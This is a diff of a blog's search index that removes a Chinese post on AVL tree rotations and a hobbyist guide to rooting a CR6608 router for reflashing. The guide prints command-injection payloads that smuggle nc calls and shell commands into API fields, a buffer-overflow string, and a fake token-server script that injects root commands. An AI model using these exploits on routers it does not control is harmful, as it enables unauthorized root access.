@@ -30,56 +30,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>AVL树的旋转</title>
-    <url>/138867439/</url>
-    <content><![CDATA[<h2 id="特定例子"><a href="#特定例子" class="headerlink" title="特定例子"></a>特定例子</h2><p>现在我们开始解决<a href="https://liangziye.online/2536969901/">AVL树</a>中提到最小不平衡子树，使AVL树重新恢复平衡状态。</p>
-<p>下图先举例一个最简单的平衡的AVL树在经过插入操作后变得不平衡的例子</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC1.png"></p>
-<p>如图所示插入结点5后，父结点7的平衡因子变为1,再往上的父节点10变为2，这个结点10就是我们要找的最小不平衡子树的根结点。我们把最小不平衡子树拿出来单独讨论。</p>
-<p>这是最简单的情况，最小不平衡子树的根结点为结点10，新插入结点5是根结点10的左子结点的左子结点，这种情况我们成为<strong>LL型</strong>（左左型）。在LL型中，根结点10比它的左子结点大，它的左子结点也比新插入的结点大，我们可以把这三个结点的位置转一转，把结点10转到结点7的右下方，也就是从结点7的父节点变成了结点7的右子结点，而结点7自己成了根结点</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC2.png"></p>
-<p>现在以结点7为根结点的子树平衡了，整个树也就重新达到AVL的平衡条件了。我们旋转的对象是根结点10，根据它的旋转方向我们称这种旋转为<strong>右旋</strong>。所以LL型我们只需要一次右旋就能重新回归平衡。因为结点10和结点7之间的大小关系，所以结点10既能做结点7的父结点，也能做结点7的右子结点，右旋操作就是将操作结点从父结点变为右子结点。</p>
-<p>这个LL型过于简单，再举个LL型的最小子树例子，下面这个例子的子树高度比上面那个例子要高，但同样只需要一次右旋就能回到平衡状态。</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC3.png"></p>
-<p>完全对称的，我们也有<strong>RR型</strong>（右右型），所以对称地我们需要一次<strong>左旋</strong>来让RR型回归平衡，我现在把LL型的例子变成RR型，再看看示意图，完全是对称的操作。右旋操作就是将操作结点从父结点变为左子结点。</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC4.png"></p>
-<h2 id="LL型"><a href="#LL型" class="headerlink" title="LL型"></a>LL型</h2><p>例子举完了，现在该分析一下所有可能存在的情况了。如下图，设想现在有一个子树的根结点t，子树处于平衡状态，它的左子树我们先记做ltree，右子树我们记做rtree。左子树和右子树中的结点数未知，但是它们的高度差因为平衡所以一定不大于1。现在我们插入一个新的结点n，假定我们插入新的结点之后，树将不再平衡，并且这个以结点t为根的子树是整个树的最小不平衡子树。那只有两种插入情况，一种是插入在左子树上，左子树比右子树高2，一种是插在右子树上，右子树比左子树高2，我们把比较矮的一边子树的高度记做h，则另一边比较高的子树的高度为h+2。当然h必须h≥0。可以想象到这两种情况是对称的，那他们解决平衡的操作也是对称的。</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC5.png"></p>
-<p>我们现在拿情况1出来分析，把ltree又分为它的根结点tl和tl的左子树lltree和右子树lrtree，同样有两种情况，结点n要么是接在lltree上要么是接在lrtree上，根据上面的讨论，高度如下图所示，同时我也标注好了平衡因子。</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC6.png"></p>
-<p>注意！以上的讨论都是建立在结点t构成的子树为最小不平衡子树下。因为这个子树为最小不平衡子树，所以必然的，情况1-1中lltree和lrtree还有rtree三个子树的高度都相等都是h，情况1-2中rltree和rrtree还有ltree三个子树的高度也相等也都是h。h要满足h≥0。反过来说lltree和lrtree还有rtree（或是rltree和rrtree还有ltree）它们的高度不可能不相等，如果不相等那结点t构成的子树就不是最小不平衡子树，记住我们所讨论的情况都是建立在结点t是最小不平衡子树的根结点上的。</p>
-<p>对于情况1-1我们可以继续分类讨论出情况1-1-1和1-1-2……但这样套娃已经完全没有必要了，因为我们现在就能针对情况1-1做出普适性的回归平衡方法。</p>
-<p>现在我们针对情况1-1来看，发现上文中右旋的两个例子就是情况1-1，情况1-1即是LL型。当lltree和lrtree还有rtree的高度为0时，就是上文右旋的第一个例子，而这三个子树高度为1时，就是上文右旋中第二个例子。可以继续推导的是，lltree和lrtree还有rtree的高度h只要满足h≥0，这种最小不平衡子树都是LL型，能都通过对根结点t一次右旋重新回归平衡，如下图。</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC7.png"></p>
-<h2 id="LR型"><a href="#LR型" class="headerlink" title="LR型"></a>LR型</h2><p>接下来讨论情况1-2，我们发现这不再是LL型了，我们无法通过一次右旋来解决问题，如下图：</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC8.png"></p>
-<p>我们需要继续分析讨论情况1-2，分类讨论结点n插入的更准确的位置。我们把lrtree这个子树细分成结点tlr和其左右子树lrltree和lrrtree。我们对情况1-2分别得到以下两种情况1-2-a和1-2-b。1-2-a是结点n插在lrltree上，1-2-b是结点n插在lrrtree上。</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC9.png"></p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC10.png"></p>
-<p>经过分析我们发现，虽然我们不能通过一次右旋来回归平衡，但是我们发现如果对情况1-2-a和1-2-b中的结点tl进行一次左旋，我们将把情况1-2-a和1-2-b转变了LL型，如下图</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC11.png"></p>
-<p>情况1-2-a和1-2-b进行了左旋之后，得到的LL型是有区别的，情况1-2-a左旋结果的结点tlr的平衡因子为2，最小不平衡子树变成了以结点tlr为根的最小不平衡子树，不是结点t。而情况1-2-b左旋结果的结点tlr的平衡因子为1，所以依然是以结点t为根结点的最小不平衡子树。对于情况1-2-a左旋结果，它的最小不平衡子树变了，虽然也是LL型，但是我们能对结点tlr做一次右旋让它回归平衡吗？答案是不能，这样又变回情况情况1-2-a了，左右旋本身就是互为反操作。那这样的话，我们依旧是把情况1-2-a左旋结果的最小不平衡子树当做没有变动，根结点依旧是结点t，所以对于情况1-2-a左旋结果和情况1-2-b左旋结果，这两个都是根为结点t的LL型，我们对结点t做一次右旋即可回归平衡。如下图。</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC12.png"></p>
-<p>情况1-2细分的两种情况现在就已经解决了不平衡问题，方法都是先对结点tl做一次左旋，再对结点t做一次右旋，我们把情况1-2称作LR型。所以LR型的最小不平衡子树，我们先对根结点t的左子节点tl做左旋转换成LL型后，再对结点t做右旋，即可平衡。但LR型里面也是有区别的，虽然都是对结点一样的操作，可重新平衡之后结点t和结点tl的平衡因子是不一样的，在实现上要注意处理这个问题。</p>
-<h2 id="RR型和RL型"><a href="#RR型和RL型" class="headerlink" title="RR型和RL型"></a>RR型和RL型</h2><p>至此，其实我们已经解决掉AVL树的一半旋转方法了。LL型对根结点t做一次右旋，LR型对根结点t的左子节点tl做一次左旋再对结点t做一次右旋。对称地，我们可以得知，把LL型和LR型镜像翻转过来我们得到RR型，和RL型，重新平衡的操作也是对称的，对于RR型应当对根结点t做一次左旋，对于RL型应当对根结点t的右子结点tr做一次右旋，再对结点t做一次左旋。于是我们对于所有的不平衡情况都给出了平衡的旋转方法。下面示意图表示一下RR和RL的过程，就不从头分析一遍了。</p>
-<p>RR型：</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC13.png"></p>
-<p>RL型</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC14.png"></p>
-<p>RL型对结点tr右旋转换成RR型：</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC15.png"></p>
-<p>最后再对结点t左旋：</p>
-<p><img src="https://assets.liangziye.online/image/AVL%E6%A0%91%E7%9A%84%E6%97%8B%E8%BD%AC16.png"></p>
-]]></content>
-      <categories>
-        <category>数据结构</category>
-      </categories>
-      <tags>
-        <tag>tree</tag>
-        <tag>AVLTree</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Buffer和TypedArray</title>
     <url>/3902632945/</url>
     <content><![CDATA[<p>不想写await/sync，又不想嵌套括号，于是偷懒用了sync-request，两行就完成了GET请求，但是返回的结果对象，内部有三个字段，headers是对象，url是字符串，唯独body是一串二进制不能直接阅读，需要处理的数据。主要很奇怪的是在编辑器上console出来，控制台显示这是一个uint8Array，调试显示的也是一个uint8Array，但在终端补全时候提示却是一个Buffer。instanceof这两个都是true，unit8Array和Buffer是一个东西吗?</p>
@@ -187,167 +137,54 @@
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/1/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录了从无到有将CR6608从官方固件刷成集客AP，并在局域网中安装集客软AC的完整过程，仅仅是本人自身实践的回顾和对刷机原理的总结，因环境存在差异，刷机有风险，如需使用请谨慎参照本文，不可照搬。另外，CR660X的刷机到现在已经非常普遍非常简单了，所有资料所有知识都来自于各个博客和论坛相关帖子，文中的操作全都可以通过搜索引擎搜索得到。</p>
-<p>CR6606/CR6608/CR6609/TR608各型号的区别不在下文实践范围内，其中的差异需要搜索其他资料来确定。下文所有操作都基于CR6608、所有提到的“路由器”都特指CR6608。</p>
-<h2 id="当前环境："><a href="#当前环境：" class="headerlink" title="当前环境："></a>当前环境：</h2><ul>
-<li>CR6608为移动的1.0.23版本，双频WIFI开启但不合并，SSID和密码默认与机器背部贴纸上一致，工作模式为“普通路由工作模式”，DHCP开启，局域网IP为默认即192.168.10.1</li>
-</ul>
-<h2 id="必要环境"><a href="#必要环境" class="headerlink" title="必要环境"></a>必要环境</h2><ul>
-<li>CR6608为运营商官方固件，其版本必须足够低，若是高版本建议先刷为低版本。</li>
-</ul>
-<h2 id="1：启用路由器的SSHD"><a href="#1：启用路由器的SSHD" class="headerlink" title="1：启用路由器的SSHD"></a>1：启用路由器的SSHD</h2><p>利用漏洞向路由器注入命令，启用路由器的sshd。</p>
-<p>下文中所有实践的方法都是需要登录路由器管理页面的，登录成功后保持管理页面不要关闭，在地址栏获得stok参数的值，有了它就可以请求路由器的api了。api通常为: <code>http://[浏览器ip]/cgi-bin/luci/;stok=[stok值]/api/xxxxxxx/xxxxxxxx</code>，下文中所有提到的api都简写为<code>/api/xxxxxxx/xxxxxxxx</code>。下文中提到的<a href="https://blog.thalium.re/posts/rooting-xiaomi-wifi-routers/">Rooting Xiaomi WiFi Routers</a>文章也讨论了不需要stok值即不需要登录管理页面的相关漏洞，但它不在本文实践范围之内。</p>
-<h4 id="1-1：利用smartcontroller漏洞"><a href="#1-1：利用smartcontroller漏洞" class="headerlink" title="1.1：利用smartcontroller漏洞"></a>1.1：利用smartcontroller漏洞</h4><p>利用这个漏洞的前提是路由器开启smartcontroller，如果没有开启就发起请求会得到Internal Server Error的响应，开启smartcontroller需要使用api：<code>/api/misystem/set_sys_time</code>来设定系统时间，这个api接受一个名为<code>time</code>的参数，把值设为<code>2023-2-19 23:4:47&amp;timezone=CST-8</code>即可开启smartcontroller。这个请求为GET请求。</p>
-<p><a href="https://blog.thalium.re/posts/rooting-xiaomi-wifi-routers/">Rooting Xiaomi WiFi Routers</a>文章中，有一个关于smartcontroller的注入漏洞，对于api：<code>/api/xqsmarthome/request_smartcontroller</code>，接受一个名为<code>payload</code>的参数，文章内已经为我们构造了这个参数的值：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;command&quot;</span>:<span class="string">&quot;scene_setting&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>:<span class="string">&quot;it3&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;action_list&quot;</span>:[</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">&quot;thirdParty&quot;</span>:<span class="string">&quot;xmrouter&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;delay&quot;</span>:<span class="number">17</span>,</span><br><span class="line">                <span class="attr">&quot;type&quot;</span>:<span class="string">&quot;wan_block&quot;</span>,</span><br><span class="line">                <span class="attr">&quot;payload&quot;</span>:</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">&quot;command&quot;</span>:<span class="string">&quot;wan_block&quot;</span>,</span><br><span class="line">					  <span class="comment">//注入。方式一。路由器会执行nc 192.168.31.161 4242</span></span><br><span class="line">                        <span class="attr">&quot;mac&quot;</span>:<span class="string">&quot;;nc 192.168.31.161 4242;#&quot;</span></span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">    <span class="attr">&quot;launch&quot;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;timer&quot;</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">&quot;time&quot;</span>:<span class="string">&quot;2:2&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;repeat&quot;</span>:<span class="string">&quot;0&quot;</span>,</span><br><span class="line">                    <span class="attr">&quot;enabled&quot;</span>:<span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>上面json中的<code>mac</code>值就是注入的地方，有多种方式可以注入，路由器会以root执行注入的命令</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方式一。路由器会执行nc 192.168.31.161 4242</span></span><br><span class="line"><span class="string">&quot;mac&quot;</span>:<span class="string">&quot;;nc 192.168.31.161 4242;#&quot;</span></span><br><span class="line"><span class="comment">//方式二。利用栈缓冲区溢出，此种方式不合适命令注入）</span></span><br><span class="line"><span class="string">&quot;mac&quot;</span>:<span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%de%ad%be%ef&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>除<code>mac</code>值之外，<code>name</code>值也能注入</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方式三。路由器会执行nc 192.168.31.161 4242</span></span><br><span class="line"><span class="string">&quot;name&quot;</span>:<span class="string">&quot;&#x27;$(nc 192.168.31.98 4242)&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>向路由器这个api发送带着上文<code>payload</code>的POST请求之后，我们再向这个api发送另一个POST请求带着下面的<code>payload</code>即可触发命令的执行：</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;command&quot;</span>:<span class="string">&quot;scene_start_by_crontab&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;time&quot;</span>:<span class="string">&quot;2:2&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;week&quot;</span>:<span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以使用任何工具发起POST请求带上字段为<code>payload</code>的参数即可，切记每一次发送了带注入命令的<code>payload</code>之后，需要接着发送上文中第二个<code>payload</code>才能触发命令的执行。</p>
-<p>关于有关启用sshd的命令，路由器的sshd服务端为dropbear，需要执行的命令为：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i s/release/XXXXXX/g /etc/init.d/dropbear</span><br><span class="line">nvram <span class="built_in">set</span> ssh_en=1</span><br><span class="line">nvram commit</span><br><span class="line">/etc/init.d/dropbear <span class="built_in">enable</span></span><br><span class="line">/etc/init.d/dropbear restart</span><br></pre></td></tr></table></figure>
-
-<p>以下是有关此漏洞开启sshd的现成命令与工具：</p>
-<p><a href="https://github.com/mphin/miwifi_tools?tab=readme-ov-file">mphin/miwifi_tools</a>使用curl发送请求，只需要替换掉README中的每一条curl命令中的路由器IP和stok值，一条条按顺序执行即可。需要强调的是powershell中的curl命令实际上为Invoke-WebRequest的别名，如需在powershell中使用真正的curl需要调用curl.exe而不是curl；开启sshd后，root账户的密码可以先试试管理页的登录密码，如果不对需要计算得到<a href="https://miwifi.dev/ssh">Xiaomi Router Developer Guide &amp; Tools</a>。</p>
-<p><a href="https://www.right.com.cn/forum/thread-8348455-1-1.html">【教程】小米 AX3000/AX3600/AX9000/万兆路由器/AC2100/AC2350/AX1800/AX5400 开启SSH-小米无线路由器及小米网络设备-恩山无线论坛</a>详细地写了使用curl开启sshd的教程；</p>
-<p>最后，项目<a href="https://github.com/openwrt-xiaomi/xmir-patcher">openwrt-xiaomi/xmir-patcher</a>包含了开启sshd的功能，也有刷bl等其他功能但我没有在路由器上尝试。这个项目在使用上简单友好，有菜单，有交互输入，clone下来运行并按菜单指示操作就可以了。注意，根据交互输出的提示，此项目已经把root账户密码重置为了root。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/openwrt-xiaomi/xmir-patcher.git</span><br><span class="line">cd xmir-patcher</span><br><span class="line"><span class="meta">#</span><span class="bash">windows下执行!START.bat</span> </span><br><span class="line">.\!START.bat</span><br><span class="line"><span class="meta">#</span><span class="bash">linux下执行run.sh 需要python 3.8+和openssl</span></span><br><span class="line">./run.sh</span><br></pre></td></tr></table></figure>
-
-<p>环境没有安装git可以直接下载项目解压执行。</p>
-<h4 id="1-2：利用小米换机漏洞"><a href="#1-2：利用小米换机漏洞" class="headerlink" title="1.2：利用小米换机漏洞"></a>1.2：利用小米换机漏洞</h4><p>利用这个漏洞的方法是让路由器连上一个wifi，此wifi必须满足在子网内没有DHCP服务，同时在子网内存在IP为169.254.31.1的主机，CR6608可以ping通此主机。</p>
-<p>原理是当路由器没有被DHCP分配IP时会把自己的IP设为169.254.31.2，此时任意一台电脑向路由器请求<code>/api/xqsystem/oneclick_get_remote_token</code>会使路由器向169.254.31.1请求<code>/api/xqsystem/token</code>，路由器收到169.254.31.1的响应后，会执行包含在响应中名为<code>token</code>字段的值里面的任何命令，所以只要把开启sshd的命令写在这个值内，路由器即可开启sshd。</p>
-<p>利用小米换机漏洞的步骤比较繁杂，暂时没有找到一键式的工具，各个帖子利用此漏洞所采取的操作也八仙过海，从效率和使用的角度来看，应该尽量利用smartcontroller漏洞来开启sshd。</p>
-<p>准备：</p>
-<ul>
-<li>两台电脑，其中一台电脑可以安装虚拟机，有无线网卡能开启移动热点，定义为电脑A，另外一台定义为电脑B。</li>
-<li>路由器关闭双频合一，2.4G的WIFI开启。</li>
-</ul>
-<h6 id="1-2-1：电脑A安装VirtualBox"><a href="#1-2-1：电脑A安装VirtualBox" class="headerlink" title="1.2.1：电脑A安装VirtualBox"></a>1.2.1：电脑A安装VirtualBox</h6><p>windows系统有winget可直接在终端使用winget安装，过程不短，中途有可能会多次断网和黑屏，需要耐心等待，安装完最好重启电脑A。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">winget install --id Oracle.VirtualBox</span><br></pre></td></tr></table></figure>
-
-<p>没有winget或者其他系统可用其他包管理器安装或者直接在官网<a href="https://www.virtualbox.org/wiki/Downloads">Downloads – Oracle VirtualBox</a>下载安装。</p>
-<p>也可以用其他虚拟机软件，如VM等。</p>
-<h6 id="1-2-2：下载OpenWrt固件，将img格式的固件转换为VirtualBox的vdi格式文件，在VirtualBox中安装新建虚拟机"><a href="#1-2-2：下载OpenWrt固件，将img格式的固件转换为VirtualBox的vdi格式文件，在VirtualBox中安装新建虚拟机" class="headerlink" title="1.2.2：下载OpenWrt固件，将img格式的固件转换为VirtualBox的vdi格式文件，在VirtualBox中安装新建虚拟机"></a>1.2.2：下载OpenWrt固件，将img格式的固件转换为VirtualBox的vdi格式文件，在VirtualBox中安装新建虚拟机</h6><p>从<a href="https://firmware-selector.openwrt.org/">官网</a>下载合适的固件，此处用的固件是<a href="https://downloads.openwrt.org/releases/22.03.5/targets/x86/64/openwrt-22.03.5-x86-64-generic-ext4-combined-efi.img.gz">openwrt-22.03.5-x86-64-generic-ext4-combined-efi.img</a>。<code>cd</code>到VirtualBox根目录中，使用根目录下的vboxmanage转换固件的文件格式：</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\vboxmanage.exe convertfromraw &quot;输入的img文件路径&quot; &quot;输出的vdi文件路径&quot; -format VDI</span><br></pre></td></tr></table></figure>
-
-<p>得到vdi格式的文件后，打开VirtualBox新建虚拟机，将vdi文件作为此虚拟机的虚拟硬盘。</p>
-<blockquote>
-<p>踩坑：</p>
-<p>一开始选择了24版本的OpenWrt，安装后发现目录有些变化，找不到LuCI的controller，为了节省时间直接使用电脑里很久之前下载好的22版本。</p>
-<p>官网下载的文件格式是gz，我在windows上用7z解压报错，找不到原因后无奈移动它到debian上用<code>gzip -d xxxx.gz</code>解压。</p>
-<p>新建虚拟机完成后无法启动虚拟机，报错<code>error in supR3HardenedWinReSpawn</code>，原因是服务没有安装成功，需要右键菜单安装VirtualBox根目录下的<code>.\drivers\vboxsup\VBoxSup.inf</code>再重启电脑A。</p>
-</blockquote>
-<h6 id="1-2-3：启动OpenWrt虚拟机，新建lua脚本，关闭LAN接口的DHCP，修改LAN接口的IP地址为169-254-31-1，掩码为255-255-255-0"><a href="#1-2-3：启动OpenWrt虚拟机，新建lua脚本，关闭LAN接口的DHCP，修改LAN接口的IP地址为169-254-31-1，掩码为255-255-255-0" class="headerlink" title="1.2.3：启动OpenWrt虚拟机，新建lua脚本，关闭LAN接口的DHCP，修改LAN接口的IP地址为169.254.31.1，掩码为255.255.255.0"></a>1.2.3：启动OpenWrt虚拟机，新建lua脚本，关闭LAN接口的DHCP，修改LAN接口的IP地址为169.254.31.1，掩码为255.255.255.0</h6><p>为了方便修改OpenWrt的配置，暂时先从VirtualBox的控制台使用终端修改OpenWrt的LAN口IP为与当前电脑网络相同网段，这里电脑A是192.168.2.135/24，所以可以把OpenWrt的LAN口IP暂时先设置为这个网段下没有其他设备使用的IP如192.168.2.136。具体操作：双击虚拟机启动后弹出VirtualBox的控制台，在控制台编辑文件：<code>vim /etc/config/network</code>，修改<code>interface lan</code>下面的<code>option ipaddr</code>处的IP。修改完成重启网卡：<code>/etc/init.d/network restart</code>或重启系统：<code>reboot</code>。同时在VirtualBox处将OpenWrt虚拟机的网络改为桥接，桥接对象为电脑A当前正在上网的网卡，此时电脑A就能连接上虚拟机了，试试<code>ping 192.168.2.136</code>是否ping通。从windows终端处ssh连接它和使用浏览器登录webui都能更方便管理和修改配置。（这一步其实是完全多余的，当然也可以不做，下文操作以任意方式连上OpenWrt都可以完成）</p>
-<p>在电脑A上使用终端ssh进OpenWrt，在<code>/usr/lib/lua/luci/controller/admin/</code>下新建一个名为<code>xqsystem.lua</code>的脚本，内容如下：</p>
-<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">module</span>(<span class="string">&quot;luci.controller.admin.xqsystem&quot;</span>, <span class="built_in">package</span>.<span class="built_in">seeall</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> page   = node(<span class="string">&quot;api&quot;</span>)</span><br><span class="line">    page.target  = firstchild()</span><br><span class="line">    page.title   = (<span class="string">&quot;&quot;</span>)</span><br><span class="line">    page.order   = <span class="number">100</span></span><br><span class="line">    page.index = <span class="literal">true</span></span><br><span class="line">    page   = node(<span class="string">&quot;api&quot;</span>,<span class="string">&quot;xqsystem&quot;</span>)</span><br><span class="line">    page.target  = firstchild()</span><br><span class="line">    page.title   = (<span class="string">&quot;&quot;</span>)</span><br><span class="line">    page.order   = <span class="number">100</span></span><br><span class="line">    page.index = <span class="literal">true</span></span><br><span class="line">    entry(&#123;<span class="string">&quot;api&quot;</span>, <span class="string">&quot;xqsystem&quot;</span>, <span class="string">&quot;token&quot;</span>&#125;, call(<span class="string">&quot;getToken&quot;</span>), (<span class="string">&quot;&quot;</span>), <span class="number">103</span>, <span class="number">0x08</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">local</span> LuciHttp = <span class="built_in">require</span>(<span class="string">&quot;luci.http&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getToken</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&quot;code&quot;</span>] = <span class="number">0</span></span><br><span class="line">    result[<span class="string">&quot;token&quot;</span>] = <span class="string">&quot;; nvram set ssh_en=1; nvram commit; sed -i &#x27;s/channel=.*/channel=\&quot;debug\&quot;/g&#x27; /etc/init.d/dropbear; /etc/init.d/dropbear start;&quot;</span></span><br><span class="line">    LuciHttp.write_json(result)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
-
-<p>浏览器访问192.168.2.135进入OpenWrt的webui，默认密码为空。点击“Network”-“Interface”-Edit”修改lan接口，在“General Settings”下修改ipv4地址为169.254.31.1,子网掩码为255.255.255.0，在“DHCP Server”选项卡下，勾选“General Setup”下的“Ignore interface”，取消勾选“Advanced Settings”下的“Dynamic DHCP”。点击“Save”保存，点击“Save &amp; Apply”应用。修改完这些配置之后，电脑A是连不上OpenWrt的，为了不出现莫名其妙的问题，此时可以在VirtualBox重启一下OpenWrt。</p>
-<blockquote>
-<p>踩坑：</p>
-<p>单单通过勾选“Ignore interface”来禁用DHCP无法应用配置，再加上取消勾选“Dynamic DHCP”就可以了。</p>
-</blockquote>
-<h6 id="1-2-4：开启电脑A的移动热点，将OpenWrt虚拟机的网络桥接到热点的虚拟网卡上，通过取消热点虚拟网卡的IP协议来完全禁用DHCP"><a href="#1-2-4：开启电脑A的移动热点，将OpenWrt虚拟机的网络桥接到热点的虚拟网卡上，通过取消热点虚拟网卡的IP协议来完全禁用DHCP" class="headerlink" title="1.2.4：开启电脑A的移动热点，将OpenWrt虚拟机的网络桥接到热点的虚拟网卡上，通过取消热点虚拟网卡的IP协议来完全禁用DHCP"></a>1.2.4：开启电脑A的移动热点，将OpenWrt虚拟机的网络桥接到热点的虚拟网卡上，通过取消热点虚拟网卡的IP协议来完全禁用DHCP</h6><p>windows需要连接任意的WIFI才能打开移动热点，连接任意WIFI打开移动热点后，在设置中修改好热点的SSID和密码，“共享我的Internet连接”选WLAN，关闭“节能”选项避免操作过程中热点自动关闭。在控制面板中的“网络和Internet”中的“网络连接”，对热点的虚拟网卡右键属性，取消勾选“Internet协议版本4”和“Internet协议版本6”，点击层层确定按钮以完全关闭这些设置窗口以避免设置不生效。最后再到VirtualBox将OpenWrt的网络桥接对象改为此热点的虚拟网卡。至此，任何连上电脑A热点的设备都能连上OpenWrt虚拟机。</p>
-<blockquote>
-<p>踩坑：</p>
-<p>最开始我选择开启CR6608的SSH方案是在电脑A起一个Nginx而不是虚拟机，但是我发现将热点的IP设置为169.254.31.1并取消无线网卡的共享以达到禁用DHCP的目的的时候，CR6608连接电脑A热点总是不成功，虽然最初的十几秒WIFI已经连上，在OpenWrt也是可以ping通169.254.31.2的，但是WIFI最终会断掉，断掉后在电脑B的浏览器返回“DHCP failed code 1619”。其次我尝试过不使用热点而是第三方旧路由器方案，依然会报这个错，也许跟我电脑A的网络拓扑和DHCP没有成功禁用有关系。</p>
-</blockquote>
-<h6 id="1-2-5：电脑B连接路由器，进入路由器的web管理界面，复制浏览器地址栏URL参数中的stok值备用"><a href="#1-2-5：电脑B连接路由器，进入路由器的web管理界面，复制浏览器地址栏URL参数中的stok值备用" class="headerlink" title="1.2.5：电脑B连接路由器，进入路由器的web管理界面，复制浏览器地址栏URL参数中的stok值备用"></a>1.2.5：电脑B连接路由器，进入路由器的web管理界面，复制浏览器地址栏URL参数中的stok值备用</h6><p>路由器通电，电脑B网线连接路由器的LAN口，电脑B的网卡IP地址设置为与路由器LAN口IP同一网段，这里设置为192.168.10.34。若电脑B用无线连接路由器，则要确保路由器的双频没有合一，并且只连接其5G的WIFI，因为2.4G在后续需要连接电脑A的热点，同时也要记得修改无线网卡的IP。浏览器输入路由器的IP地址即192.168.10.1，进入管理界面后复制浏览器地址栏URL参数中的stok值备用。注意！电脑B中的管理界面不能关掉，浏览器不能关掉，不能断开与路由器的连接，以此来保证stok值不发生变化。</p>
-<blockquote>
-<p>CR6606/CR6608/CR6609默认IP分别为：192.168.31.1、192.168.10.1、192.168.2.1</p>
-</blockquote>
-<h6 id="1-2-6：在电脑B浏览器访问路由器的api：-api-misystem-extendwifi-connect，使路由器去连接电脑A的热点"><a href="#1-2-6：在电脑B浏览器访问路由器的api：-api-misystem-extendwifi-connect，使路由器去连接电脑A的热点" class="headerlink" title="1.2.6：在电脑B浏览器访问路由器的api：/api/misystem/extendwifi_connect，使路由器去连接电脑A的热点"></a>1.2.6：在电脑B浏览器访问路由器的api：<code>/api/misystem/extendwifi_connect</code>，使路由器去连接电脑A的热点</h6><p>在电脑B开启一个新的浏览器标签页或窗口，访问以下替换掉“路由器IP”、“stok值”、“热点名称”、“热点密码”的链接：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://路由器IP/cgi-bin/luci/;stok=stok值/api/misystem/extendwifi_connect?ssid=热点名称&amp;password=热点密码</span><br></pre></td></tr></table></figure>
-
